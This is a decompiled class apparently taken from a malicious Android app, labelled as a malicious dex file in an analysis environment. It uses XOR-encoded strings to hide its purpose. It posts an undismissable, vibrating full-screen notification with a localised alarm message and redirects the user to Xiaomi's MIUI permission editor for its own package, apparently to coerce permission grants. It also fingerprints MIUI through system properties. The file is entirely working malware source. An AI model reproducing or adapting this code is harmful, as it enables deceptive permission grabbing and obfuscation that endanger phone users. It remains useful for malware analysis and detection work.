package com.zjxyxnvvp.nxvxchltf.util;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import com.zjxyxnvvp.nxvxchltf.d;
import java.util.Locale;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class l {
    private static short[] $ = {3345, 3344, 3339, 3350, 3353, 3350, 3356, 3358, 3339, 3350, 3344, 3345, 851, 892, 889, 883, 891, 816, 888, 885, 866, 885, 816, 868, 895, 816, 886, 889, 872, 816, 868, 888, 885, 816, 885, 866, 866, 895, 866, 8846, 8833, 8848, 8860, 8832, 8845, 8845, 8858, 8858, 8833, 8844, 807, 811, 809, 874, 809, 813, 817, 813, 874, 823, 801, 807, 817, 822, 813, 816, 829, 807, 801, 810, 816, 801, 822, 8442, 8438, 8436, 8375, 8436, 8432, 8428, 8432, 8375, 8425, 8444, 8427, 8436, 8442, 8444, 8439, 8429, 8444, 8427, 8375, 8425, 8444, 8427, 8436, 8432, 8426, 8426, 8432, 8438, 8439, 8426, 8375, 8393, 8444, 8427, 8436, 8432, 8426, 8426, 8432, 8438, 8439, 8426, 8412, 8445, 8432, 8429, 8438, 8427, 8408, 8442, 8429, 8432, 8431, 8432, 8429, 8416, 8626, 8623, 8611, 8613, 8630, 8584, 8615, 8636, 8624, 8633, 8630, 8634, 8626, 7826, 7811, 7809, 7817, 7811, 7813, 7815, 5107, 5112, 1623, 1621, 1621, 1619, 1606, 1602, 7855, 7867, 3422, 3420, 3420, 3418, 3407, 3403, 3418, 9770, 9771, 6416, 6426, 6411, 6420, 6401, 6405, 6424, 6420, 6403, 6420, 6431, 1465, 1455, 3307, 3305, 3311, 3322, 3326, 3307, 3320, 3808, 3835, 3814, 3808, 4031, 4020, 747, 710, 710, 709, 733, 650, 715, 730, 730, 729, 650, 734, 709, 650, 729, 734, 715, 728, 734, 2833, 2821, 7491, 7543, 7542, 7533, 7536, 7531, 7537, 7527, 7536, 7458, 7534, 7527, 7537, 7458, 7523, 7538, 7538, 7534, 7531, 7521, 7523, 7542, 7531, 7533, 7532, 7537, 7781, 7780, 4319, 4334, 4334, 4286, 4347, 4332, 4338, 4351, 4331, 4348, 4347, 4336, 1709, 1723, 6062, 6043, 6028, 6035, 6039, 6026, 6039, 6028, 6110, 6047, 6110, 6034, 6047, 6029, 4088, 4067, 4094, 4088, 4870, 4877, 2787, 2812, 2813, 2808, 2801, 2740, 2790, 2785, 2810, 2810, 2813, 2810, 2803, 7046, 7058, 296, 311, 296, 373, 301, 296, 376, 296, 317, 310, 316, 313, 310, 300, 376, 297, 301, 317, 1093, 1092, 8049, 8046, 8049, 8052, 8049, 7980, 8039, 8036, 8047, 8050, 8053, 8036, 8051, 7969, 8032, 8047, 1272, 1262, 2019, 2017, 2045, 2042, 2044, 2031, 2044, 1966, 2040, 2027, 2016, 2042, 2031, 2016, 2031, 2045, 1966, 2027, 2019, 2027, 2044, 2025, 2027, 2016, 2042, 2027, 2045, 7971, 7992, 7973, 7971, 3053, 3068, 3060, 3066, 3064, 3068, 3018, 3060, 3040, 3041, 3066, 3046, 3041, 3060, 3047, 3041, 5864, 5881, 5873, 5887, 5885, 5881, 5839, 5874, 5879, 5839, 5856, 5887, 5856, 5861, 5856, 9919, 9904, 9914, 9900, 9905, 9911, 9914, 9968, 9905, 9901, 9968, 9869, 9895, 9901, 9898, 9915, 9907, 9870, 9900, 9905, 9902, 9915, 9900, 9898, 9911, 9915, 9901, 3247, 3245, 3260, 9799, 9818, 9755, 9816, 9820, 9792, 9820, 9755, 9792, 9820, 9755, 9795, 9808, 9799, 9798, 9820, 9818, 9819, 9755, 9819, 9812, 9816, 9808, 2607, 2607, 7798, 7797};

    /* renamed from: a  reason: collision with root package name */
    static boolean f374a;

    /* renamed from: b  reason: collision with root package name */
    static boolean f375b;
    static boolean c;
    static boolean d;
    static boolean e;
    static boolean f;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    static {
        d();
        b();
        c();
    }

    public static void a(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService($(0, 12, 3455));
        int i = Build.VERSION.SDK_INT;
        String $2 = $(12, 39, 784);
        String $3 = $(39, 50, 8936);
        if (i >= 26) {
            notificationManager.cancel(878);
            notificationManager.deleteNotificationChannel($3);
            NotificationChannel notificationChannel = new NotificationChannel($3, $2, 4);
            notificationChannel.setDescription("");
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(-1);
            notificationChannel.enableVibration(true);
            notificationChannel.setVibrationPattern(new long[]{1500, 1500, 1500, 1500, 1500});
            notificationChannel.setShowBadge(false);
            if (notificationManager.getNotificationChannel($3) == null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        Intent intent = new Intent();
        intent.setClassName($(50, 73, 836), $(73, 130, 8345));
        intent.putExtra($(130, 143, 8663), context.getPackageName());
        intent.setData(Uri.fromParts($(143, 150, 7906), context.getPackageName(), null));
        Notification build = (Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(context, $3) : new Notification.Builder(context)).setContentTitle(b.l(context)).setContentText($2).setFullScreenIntent(PendingIntent.getActivity(context, 0, intent, 134217728), true).setOngoing(true).build();
        build.flags |= 32;
        notificationManager.notify(878, build);
    }

    private static String b() {
        Locale locale = Locale.getDefault();
        return locale.getLanguage().toLowerCase().equals($(150, 152, 5014)) ? $(152, 158, 1590) : locale.getLanguage().toLowerCase().equals($(158, 160, 7881)) ? $(160, 167, 3391) : locale.getLanguage().toLowerCase().equals($(167, 169, 9806)) ? $(169, 180, 6513) : locale.getLanguage().toLowerCase().equals($(180, 182, 1500)) ? $(182, 189, 3210) : $(189, 193, 3733);
    }

    private static String c() {
        Locale locale = Locale.getDefault();
        return locale.getLanguage().toLowerCase().equals($(193, 195, 4058)) ? $(195, 214, 682) : locale.getLanguage().toLowerCase().equals($(214, 216, 2935)) ? $(216, 242, 7426) : locale.getLanguage().toLowerCase().equals($(242, 244, 7681)) ? $(244, 256, 4254) : locale.getLanguage().toLowerCase().equals($(256, 258, 1736)) ? $(258, 272, 6142) : $(272, 276, 3981);
    }

    private static String d() {
        Locale locale = Locale.getDefault();
        return locale.getLanguage().toLowerCase().equals($(276, 278, 4963)) ? $(278, 291, 2708) : locale.getLanguage().toLowerCase().equals($(291, 293, 7136)) ? $(293, 311, 344) : locale.getLanguage().toLowerCase().equals($(311, 313, 1057)) ? $(313, 329, 7937) : locale.getLanguage().toLowerCase().equals($(329, 331, 1181)) ? $(331, 358, 1934) : $(358, 362, 8022);
    }

    public static boolean e(Context context) {
        if (!f) {
            e = d.e.f314a.g(context, $(362, 378, 2965));
            f = true;
        }
        return e;
    }

    public static boolean f(Context context) {
        if (!d) {
            c = d.e.f314a.g(context, $(378, 393, 5776));
            d = true;
        }
        return c;
    }

    public static boolean g() {
        if (!f374a) {
            try {
                Class<?> cls = Class.forName($(393, 420, 9950));
                String str = (String) cls.getMethod($(420, 423, 3272), String.class).invoke(cls, $(423, 446, 9781));
                f375b = str != null && (str.contains($(446, 448, 2590)) || str.contains($(448, 450, 7751)));
            } catch (Exception unused) {
                f375b = false;
            }
            f374a = true;
        }
        return f375b;
    }
}
